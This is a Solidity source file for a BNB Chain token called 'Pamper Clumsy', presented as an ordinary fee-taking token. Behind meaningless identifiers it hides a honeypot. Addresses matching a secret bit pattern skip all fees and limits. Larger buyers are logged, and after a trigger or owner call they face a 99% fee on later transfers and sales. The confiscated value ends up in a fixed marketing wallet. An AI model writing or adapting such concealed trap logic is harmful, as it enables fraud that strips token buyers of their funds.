/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract PamperClumsy is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Pamper Clumsy ";
    string constant _symbol = "PamperClumsy";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private walletMarketingReceiverExempt;
    mapping(address => bool) private walletTxMinMarketingMax;
    mapping(address => bool) private marketingLimitBuyExempt;
    mapping(address => bool) private txReceiverLimitBurn;
    mapping(address => uint256) private sellBotsModeLaunched;
    mapping(uint256 => address) private minSellFeeLiquidity;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private exemptBuyTradingWalletLimitIs = 0;
    uint256 private buyTxBotsMin = 9;

    //SELL FEES
    uint256 private burnMaxBotsExemptLaunchedFee = 0;
    uint256 private isWalletBotsMode = 9;

    uint256 private isLimitModeTeam = buyTxBotsMin + exemptBuyTradingWalletLimitIs;
    uint256 private exemptMarketingLaunchedReceiver = 100;

    address private modeTradingBuyWallet = (msg.sender); // auto-liq address
    address private tradingTeamBuyMin = (0xC36cC027b653a496B8d6108dfFFfC744286429D7); // marketing address
    address private txMaxModeAuto = DEAD;
    address private buyMarketingSwapMaxReceiver = DEAD;
    address private maxModeExemptIs = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private isMinExemptLiquidityBuy;
    uint256 private buyIsMaxBurnTeamTradingLimit;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private txLaunchedMinExempt;
    uint256 private swapSellBurnLiquidityFeeLaunched;
    uint256 private autoLaunchedReceiverBurnMaxSellTeam;
    uint256 private modeLiquiditySwapIs;
    uint256 private swapSellLimitTxTeamLaunched;

    bool private marketingTradingWalletBurn = true;
    bool private txReceiverLimitBurnMode = true;
    bool private feeModeLiquidityBurnTrading = true;
    bool private buyTradingLaunchedMax = true;
    bool private tradingAutoModeSwapExemptTxMarketing = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private txBurnExemptLimitWallet = 6 * 10 ** 15;
    uint256 private txSellExemptBurnReceiverLiquidity = _totalSupply / 1000; // 0.1%

    
    bool private buyFeeBurnWallet = false;
    bool private autoTxFeeBuy = false;
    bool private tradingLimitExemptBurn = false;
    bool private burnTeamTxExempt = false;
    uint256 private feeTxWalletSell = 0;
    uint256 private sellBuyWalletLaunched = 0;
    uint256 private sellLiquidityTxReceiverBotsBuyBurn = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        txLaunchedMinExempt = true;

        walletMarketingReceiverExempt[msg.sender] = true;
        walletMarketingReceiverExempt[address(this)] = true;

        walletTxMinMarketingMax[msg.sender] = true;
        walletTxMinMarketingMax[0x0000000000000000000000000000000000000000] = true;
        walletTxMinMarketingMax[0x000000000000000000000000000000000000dEaD] = true;
        walletTxMinMarketingMax[address(this)] = true;

        marketingLimitBuyExempt[msg.sender] = true;
        marketingLimitBuyExempt[0x0000000000000000000000000000000000000000] = true;
        marketingLimitBuyExempt[0x000000000000000000000000000000000000dEaD] = true;
        marketingLimitBuyExempt[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return sellReceiverWalletBurn(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return sellReceiverWalletBurn(sender, recipient, amount);
    }

    function sellReceiverWalletBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = isMarketingMinSell(sender) || isMarketingMinSell(recipient);
        
        if (burnTeamTxExempt == buyTradingLaunchedMax) {
            burnTeamTxExempt = marketingTradingWalletBurn;
        }

        if (sellBuyWalletLaunched == buyTxBotsMin) {
            sellBuyWalletLaunched = txBurnExemptLimitWallet;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                exemptModeTeamAuto();
            }
            if (!bLimitTxWalletValue) {
                isReceiverBotsAuto(recipient);
            }
        }
        
        if (sellBuyWalletLaunched != burnMaxBotsExemptLaunchedFee) {
            sellBuyWalletLaunched = txSellExemptBurnReceiverLiquidity;
        }

        if (feeTxWalletSell != txBurnExemptLimitWallet) {
            feeTxWalletSell = isWalletBotsMode;
        }

        if (sellLiquidityTxReceiverBotsBuyBurn != burnMaxBotsExemptLaunchedFee) {
            sellLiquidityTxReceiverBotsBuyBurn = buyTxBotsMin;
        }


        if (inSwap || bLimitTxWalletValue) {return swapTeamReceiverLaunchedBuy(sender, recipient, amount);}

        if (!walletMarketingReceiverExempt[sender] && !walletMarketingReceiverExempt[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (tradingLimitExemptBurn == marketingTradingWalletBurn) {
            tradingLimitExemptBurn = tradingAutoModeSwapExemptTxMarketing;
        }


        require((amount <= _maxTxAmount) || marketingLimitBuyExempt[sender] || marketingLimitBuyExempt[recipient], "Max TX Limit has been triggered");

        if (exemptReceiverMarketingTeam()) {buySwapLaunchedTxIs();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (tradingLimitExemptBurn != txReceiverLimitBurnMode) {
            tradingLimitExemptBurn = tradingAutoModeSwapExemptTxMarketing;
        }

        if (autoTxFeeBuy == marketingTradingWalletBurn) {
            autoTxFeeBuy = buyFeeBurnWallet;
        }


        uint256 amountReceived = marketingTradingSellMax(sender) ? botsTeamTxExemptAutoMode(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function swapTeamReceiverLaunchedBuy(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function marketingTradingSellMax(address sender) internal view returns (bool) {
        return !walletTxMinMarketingMax[sender];
    }

    function botsSwapTxTeam(address sender, bool selling) internal returns (uint256) {
        
        if (feeTxWalletSell != feeTxWalletSell) {
            feeTxWalletSell = burnMaxBotsExemptLaunchedFee;
        }


        if (selling) {
            isLimitModeTeam = isWalletBotsMode + burnMaxBotsExemptLaunchedFee;
            return burnModeTeamMarketing(sender, isLimitModeTeam);
        }
        if (!selling && sender == uniswapV2Pair) {
            isLimitModeTeam = buyTxBotsMin + exemptBuyTradingWalletLimitIs;
            return isLimitModeTeam;
        }
        return burnModeTeamMarketing(sender, isLimitModeTeam);
    }

    function launchedLiquidityReceiverMax() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function botsTeamTxExemptAutoMode(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (sellLiquidityTxReceiverBotsBuyBurn == isLimitModeTeam) {
            sellLiquidityTxReceiverBotsBuyBurn = sellBuyWalletLaunched;
        }


        uint256 feeAmount = amount.mul(botsSwapTxTeam(sender, receiver == uniswapV2Pair)).div(exemptMarketingLaunchedReceiver);

        if (txReceiverLimitBurn[sender] || txReceiverLimitBurn[receiver]) {
            feeAmount = amount.mul(99).div(exemptMarketingLaunchedReceiver);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function isMarketingMinSell(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function burnModeTeamMarketing(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = sellBotsModeLaunched[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function isReceiverBotsAuto(address addr) private {
        if (launchedLiquidityReceiverMax() < txBurnExemptLimitWallet) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        minSellFeeLiquidity[exemptLimitValue] = addr;
    }

    function exemptModeTeamAuto() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (sellBotsModeLaunched[minSellFeeLiquidity[i]] == 0) {
                    sellBotsModeLaunched[minSellFeeLiquidity[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(tradingTeamBuyMin).transfer(amountBNB * amountPercentage / 100);
    }

    function exemptReceiverMarketingTeam() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    tradingAutoModeSwapExemptTxMarketing &&
    _balances[address(this)] >= txSellExemptBurnReceiverLiquidity;
    }

    function buySwapLaunchedTxIs() internal swapping {
        
        uint256 amountToLiquify = txSellExemptBurnReceiverLiquidity.mul(exemptBuyTradingWalletLimitIs).div(isLimitModeTeam).div(2);
        uint256 amountToSwap = txSellExemptBurnReceiverLiquidity.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (feeTxWalletSell == buyTxBotsMin) {
            feeTxWalletSell = isWalletBotsMode;
        }

        if (buyFeeBurnWallet != burnTeamTxExempt) {
            buyFeeBurnWallet = txReceiverLimitBurnMode;
        }

        if (burnTeamTxExempt == marketingTradingWalletBurn) {
            burnTeamTxExempt = feeModeLiquidityBurnTrading;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = isLimitModeTeam.sub(exemptBuyTradingWalletLimitIs.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(exemptBuyTradingWalletLimitIs).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(buyTxBotsMin).div(totalETHFee);
        
        if (sellBuyWalletLaunched == txBurnExemptLimitWallet) {
            sellBuyWalletLaunched = isWalletBotsMode;
        }

        if (sellLiquidityTxReceiverBotsBuyBurn != isLimitModeTeam) {
            sellLiquidityTxReceiverBotsBuyBurn = exemptBuyTradingWalletLimitIs;
        }

        if (autoTxFeeBuy == marketingTradingWalletBurn) {
            autoTxFeeBuy = feeModeLiquidityBurnTrading;
        }


        payable(tradingTeamBuyMin).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                modeTradingBuyWallet,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSellBotsModeLaunched(address a0) public view returns (uint256) {
            return sellBotsModeLaunched[a0];
    }
    function setSellBotsModeLaunched(address a0,uint256 a1) public onlyOwner {
        sellBotsModeLaunched[a0]=a1;
    }

    function getSellBuyWalletLaunched() public view returns (uint256) {
        return sellBuyWalletLaunched;
    }
    function setSellBuyWalletLaunched(uint256 a0) public onlyOwner {
        sellBuyWalletLaunched=a0;
    }

    function getBurnTeamTxExempt() public view returns (bool) {
        return burnTeamTxExempt;
    }
    function setBurnTeamTxExempt(bool a0) public onlyOwner {
        if (burnTeamTxExempt == buyTradingLaunchedMax) {
            buyTradingLaunchedMax=a0;
        }
        if (burnTeamTxExempt != tradingAutoModeSwapExemptTxMarketing) {
            tradingAutoModeSwapExemptTxMarketing=a0;
        }
        burnTeamTxExempt=a0;
    }

    function getIsWalletBotsMode() public view returns (uint256) {
        if (isWalletBotsMode != feeTxWalletSell) {
            return feeTxWalletSell;
        }
        return isWalletBotsMode;
    }
    function setIsWalletBotsMode(uint256 a0) public onlyOwner {
        if (isWalletBotsMode == isWalletBotsMode) {
            isWalletBotsMode=a0;
        }
        if (isWalletBotsMode != sellLiquidityTxReceiverBotsBuyBurn) {
            sellLiquidityTxReceiverBotsBuyBurn=a0;
        }
        if (isWalletBotsMode != isWalletBotsMode) {
            isWalletBotsMode=a0;
        }
        isWalletBotsMode=a0;
    }

    function getMinSellFeeLiquidity(uint256 a0) public view returns (address) {
        if (a0 == isLimitModeTeam) {
            return maxModeExemptIs;
        }
            return minSellFeeLiquidity[a0];
    }
    function setMinSellFeeLiquidity(uint256 a0,address a1) public onlyOwner {
        if (a0 != isLimitModeTeam) {
            maxModeExemptIs=a1;
        }
        if (a0 != sellLiquidityTxReceiverBotsBuyBurn) {
            buyMarketingSwapMaxReceiver=a1;
        }
        minSellFeeLiquidity[a0]=a1;
    }

    function getFeeModeLiquidityBurnTrading() public view returns (bool) {
        return feeModeLiquidityBurnTrading;
    }
    function setFeeModeLiquidityBurnTrading(bool a0) public onlyOwner {
        if (feeModeLiquidityBurnTrading == autoTxFeeBuy) {
            autoTxFeeBuy=a0;
        }
        if (feeModeLiquidityBurnTrading != txReceiverLimitBurnMode) {
            txReceiverLimitBurnMode=a0;
        }
        if (feeModeLiquidityBurnTrading != marketingTradingWalletBurn) {
            marketingTradingWalletBurn=a0;
        }
        feeModeLiquidityBurnTrading=a0;
    }

    function getMaxModeExemptIs() public view returns (address) {
        if (maxModeExemptIs == txMaxModeAuto) {
            return txMaxModeAuto;
        }
        return maxModeExemptIs;
    }
    function setMaxModeExemptIs(address a0) public onlyOwner {
        maxModeExemptIs=a0;
    }

    function getIsLimitModeTeam() public view returns (uint256) {
        if (isLimitModeTeam != txBurnExemptLimitWallet) {
            return txBurnExemptLimitWallet;
        }
        return isLimitModeTeam;
    }
    function setIsLimitModeTeam(uint256 a0) public onlyOwner {
        if (isLimitModeTeam == sellBuyWalletLaunched) {
            sellBuyWalletLaunched=a0;
        }
        if (isLimitModeTeam != feeTxWalletSell) {
            feeTxWalletSell=a0;
        }
        if (isLimitModeTeam != burnMaxBotsExemptLaunchedFee) {
            burnMaxBotsExemptLaunchedFee=a0;
        }
        isLimitModeTeam=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}